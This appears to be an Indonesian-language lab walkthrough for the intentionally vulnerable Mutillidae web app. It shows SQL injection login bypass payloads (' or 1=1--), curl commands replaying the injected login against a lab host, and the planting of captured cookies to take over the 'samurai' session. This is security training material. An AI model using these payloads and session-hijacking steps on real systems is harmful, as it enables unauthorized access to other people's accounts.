Lesson 6
--------
- **Step 1**    : Setting networks pada mozilla yang ada di Kali Linux dengan mengisi manual proxy dan diisi HHTP Proxy `127.0.0.1` dan port `8080`
- **Step 2**    : Buka aplikasi burpsuite yang sudah ada di Kali, lalu setting `intercept is off` pada tab proxy lalu tab intercept
- **Step 3**    : Lalu klik Login pada mutillidae, lalu ketik `' or 1=1--` dan jangan lupa tambahkan spasi setelah `--` dan login
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/0.JPG)
- **Step 4**    : Lalu buka aplikasi burpsuite, pada tab proxy, lalu HTTP history, buka pada host yang terdapat method post yang telah kita lakukan pada mutillidae
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/1.JPG)
- **Step 5**    : Ketik `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1--+&password=&login-php-submit-button=Login" --location "http://192.168.100.22/mutillidae/index.php?page=login.php" > login1.txt` juga ketik perintah `grep "Logged In" login1.txt` dan `cat crack_cookies.txt` pada **Terminal** di Kali lali akan muncul seperti pada gambar
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/2.JPG)
- **Step 6**    : Klik login pada web mutillidae, lalu ubah size dari **20** menjadi **50** dan ubah string **pasword** menjadi **text** pada kolom password lalu ketik `samurai` di kolom **Name** dan ketik `' or (1=1 and username='samurai')--` di kolom **Password** dan jangan lupa berikan spasi setelah `--`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/3.JPG)
- **Step 7**    : Lalu buka aplikasi burpsuite, pada tab proxy, lalu HTTP history, buka pada host yang terdapat method **post** yang telah kita lakukan pada mutillidae lalu klik drag semua hasil pada tab raw, klik kanan lalu `copy to file` dan beri nama burp2.txt
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/4.JPG)
- **Step 8**    : Ketik `grep -i cookie burp2.txt` juga ketik perintah `grep -i username burp2.txt`
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/5.JPG)
- **Step 9**    : Ketik `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=samurai&password=%27+or+%281%3D1+and+username%3D%27samurai%27%29--+&login-php-submit-button=Login" --location "http://192.168.100.22/mutillidae/index.php?page=login.php" > login2.txt` juga ketik perintah `grep "Logged In" login2.txt` dan `cat crack_cookies.txt` pada **Terminal** di Kali lali akan muncul seperti pada gambar
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/6.JPG)
- **Step 10**    : Buka cookies manager pada mozilla di Kali, lalu `add new cookie` lalu isi sesuai pada gambar di bawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/7.JPG)
- **Step 11**    : Klik `add new cookie` lalu isi sesuai pada gambar di bawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/8.JPG)
- **Step 12**    : Klik `add new cookie` lalu isi sesuai pada gambar di bawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/9.JPG)
- **Step 13**    : Klik `add new cookie` lalu isi sesuai pada gambar di bawah
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/10.JPG)
- **Step 14**    : Lakukan refresh pada web mutillidae lalu akan terlihat bahwa kita sudah login sebagai `samurai` karena kita sudah menambahkan cookie pada mozilla kita
![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%206/11.JPG)
